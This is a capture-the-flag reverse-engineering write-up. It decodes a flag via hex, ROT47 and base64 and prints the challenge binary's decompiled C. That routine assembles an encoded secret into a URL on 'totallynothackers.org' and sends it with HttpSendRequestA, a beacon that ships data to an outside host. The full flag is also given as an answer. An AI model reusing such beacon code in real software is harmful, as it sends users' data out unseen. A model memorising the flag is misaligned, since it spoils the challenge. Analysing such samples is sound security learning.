# 04

## Solution

cyberchef: hex -> rot47 (47) -> b64

```txt
2b3e49392b624522327235462b614960322768452b614962796164392b3e6437226223403528494035276824796149642b28393735613539327235462a28354429612b403576753f333f5f6c

+>I9+bE"2r5F+aI`2'hE+aIbyad9+>d7"b#@5(I@5'h$yaId+(975a592r5F*(5D)a+@5vu?3?_l

ZmxhZ3tQaCduZ2x1aV9tZ2x3J25hZm5fQ3RodWxodV9SJ2x5ZWhfd2dhaCduYWdsX2ZodGFnbn0=

flag{Ph'nglui_mglw'nafn_Cthulhu_R'lyeh_wgah'nagl_fhtagn}
```

## Attempt

```c
local_110 = "/2b/62";
local_118 = "/32/72";
local_120 = "/45/22";
local_128 = "/49/64";
local_130 = "/35/46";
local_138 = "/49/39";
local_140 = "/49/62";
local_148 = "/2b/61";
local_150 = "/49/60";
local_158 = "/35/44";
local_160 = "/23/40";
local_168 = "/32/72";
local_170 = "/22/62";
local_178 = "/35/39";
local_180 = "/2b/40";
local_188 = "/33/3f";
local_190 = "/32/27";
local_198 = "/2b/28";
local_1a0 = "/2b/3e";
local_1a8 = "/2b/61";
local_1b0 = "/79/61";
local_1b8 = "/79/61";
local_1c0 = "/35/76";
local_1c8 = "/5f/6c";
local_1d0 = "/64/39";
local_1d8 = "/68/45";
local_1e0 = "/2b/3e";
local_1e8 = "/35/28";
local_1f0 = "/49/40";
local_1f8 = "/35/27";
local_200 = "/64/37";
local_208 = "/68/24";
local_210 = "/39/37";
local_218 = "/35/46";
local_220 = "/2a/28";
local_228 = "/35/61";
local_230 = "/29/61";
local_238 = "/75/3f";
strcat(local_4b8,"/2b/3e");
strcat(local_4b8,local_138);
strcat(local_4b8,local_110);
strcat(local_4b8,local_120);
strcat(local_4b8,local_168);
strcat(local_4b8,local_130);
strcat(local_4b8,local_148);
strcat(local_4b8,local_150);
strcat(local_4b8,local_190);
strcat(local_4b8,local_1d8);
strcat(local_4b8,local_1a8);
strcat(local_4b8,local_140);
strcat(local_4b8,local_1b8);
strcat(local_4b8,local_1d0);
strcat(local_4b8,local_1e0);
strcat(local_4b8,local_200);
strcat(local_4b8,local_170);
strcat(local_4b8,local_160);
strcat(local_4b8,local_1e8);
strcat(local_4b8,local_1f0);
strcat(local_4b8,local_1f8);
strcat(local_4b8,local_208);
strcat(local_4b8,local_1b0);
strcat(local_4b8,local_128);
strcat(local_4b8,local_198);
strcat(local_4b8,local_210);
strcat(local_4b8,local_228);
strcat(local_4b8,local_178);
strcat(local_4b8,local_118);
strcat(local_4b8,local_218);
strcat(local_4b8,local_220);
strcat(local_4b8,local_158);
strcat(local_4b8,local_230);
strcat(local_4b8,local_180);
strcat(local_4b8,local_1c0);
strcat(local_4b8,local_238);
strcat(local_4b8,local_188);
strcat(local_4b8,local_1c8);
local_240 = "https://www.totallynothackers.org";
strcpy(local_5c8,"https://www.totallynothackers.org");
strcat(local_5c8,local_4b8);


  iVar2 = InternetCheckConnectionA(local_240,1,0);
  if (iVar2 == 0) {
    ShellExecuteA((HWND)0x0,"open","https://www.youtube.com/watch?v=WPUJG2jTw9s",(LPCSTR)0x0,
                  (LPCSTR)0x0,1);
  }
  else {
    HttpSendRequestA(local_5c8,0,0xffffffff,0,(ulonglong)lpData & 0xffffffff00000000);
  }
  return (int)(iVar2 == 0);
```

```c
local_110 = "/2b/62";
local_118 = "/32/72";
local_120 = "/45/22";
local_128 = "/49/64";
local_130 = "/35/46";
local_138 = "/49/39";
local_140 = "/49/62";
local_148 = "/2b/61";
local_150 = "/49/60";
local_158 = "/35/44";
local_160 = "/23/40";
local_168 = "/32/72";
local_170 = "/22/62";
local_178 = "/35/39";
local_180 = "/2b/40";
local_188 = "/33/3f";
local_190 = "/32/27";
local_198 = "/2b/28";
local_1a0 = "/2b/3e";
local_1a8 = "/2b/61";
local_1b0 = "/79/61";
local_1b8 = "/79/61";
local_1c0 = "/35/76";
local_1c8 = "/5f/6c";
local_1d0 = "/64/39";
local_1d8 = "/68/45";
local_1e0 = "/2b/3e";
local_1e8 = "/35/28";
local_1f0 = "/49/40";
local_1f8 = "/35/27";
local_200 = "/64/37";
local_208 = "/68/24";
local_210 = "/39/37";
local_218 = "/35/46";
local_220 = "/2a/28";
local_228 = "/35/61";
local_230 = "/29/61";
local_238 = "/75/3f";
strcat(local_4b8,"/2b/3e"); 
strcat(local_4b8,"/49/39");
strcat(local_4b8,"/2b/62");
strcat(local_4b8,"/45/22");
strcat(local_4b8,"/32/72");
strcat(local_4b8,"/35/46");
strcat(local_4b8,"/2b/61");
strcat(local_4b8,"/49/60");
strcat(local_4b8,"/32/27");
strcat(local_4b8,"/68/45");
strcat(local_4b8,"/2b/61");
strcat(local_4b8,"/49/62");
strcat(local_4b8,"/79/61");
strcat(local_4b8,"/64/39");
strcat(local_4b8,"/2b/3e");
strcat(local_4b8,"/64/37");
strcat(local_4b8,"/22/62");
strcat(local_4b8,"/23/40");
strcat(local_4b8,"/35/28");
strcat(local_4b8,"/49/40");
strcat(local_4b8,"/35/27");
strcat(local_4b8,"/68/24");
strcat(local_4b8,"/79/61");
strcat(local_4b8,"/49/64");
strcat(local_4b8,"/2b/28");
strcat(local_4b8,"/39/37");
strcat(local_4b8,"/35/61");
strcat(local_4b8,"/35/39");
strcat(local_4b8,"/32/72");
strcat(local_4b8,"/35/46");
strcat(local_4b8,"/2a/28");
strcat(local_4b8,"/35/44");
strcat(local_4b8,"/29/61");
strcat(local_4b8,"/2b/40");
strcat(local_4b8,"/35/76");
strcat(local_4b8,"/75/3f");
strcat(local_4b8,"/33/3f");
strcat(local_4b8,"/5f/6c");

```

```txt
/2b/3e
/49/39
/2b/62
/45/22
/32/72
/35/46
/2b/61
/49/60
/32/27
/68/45
/2b/61
/49/62
/79/61
/64/39
/2b/3e
/64/37
/22/62
/23/40
/35/28
/49/40
/35/27
/68/24
/79/61
/49/64
/2b/28
/39/37
/35/61
/35/39
/32/72
/35/46
/2a/28
/35/44
/29/61
/2b/40
/35/76
/75/3f
/33/3f
/5f/6c
```


```txt
/2b/3e/49/39/2b/62/45/22/32/72/35/46/2b/61/49/60/32/27/68/45/2b/61/49/62/79/61/64/39/2b/3e/64/37/22/62/23/40/35/28/49/40/35/27/68/24/79/61/49/64/2b/28/39/37/35/61/35/39/32/72/35/46/2a/28/35/44/29/61/2b/40/35/76/75/3f/33/3f/5f/6c

2b3e49392b624522327235462b614960322768452b614962796164392b3e6437226223403528494035276824796149642b28393735613539327235462a28354429612b403576753f333f5f6c

from hex
+>I9+bE"2r5F+aI`2'hE+aIbyad9+>d7"b#@5(I@5'h$yaId+(975a592r5F*(5D)a+@5vu?3?_l

```

https://www.totallynothackers.org/2b/3e/49/39/2b/62/45/22/32/72/35/46/2b/61/49/60/32/27/68/45/2b/61/49/62/79/61/64/39/2b/3e/64/37/22/62/23/40/35/28/49/40/35/27/68/24/79/61/49/64/2b/28/39/37/35/61/35/39/32/72/35/46/2a/28/35/44/29/61/2b/40/35/76/75/3f/33/3f/5f/6c






















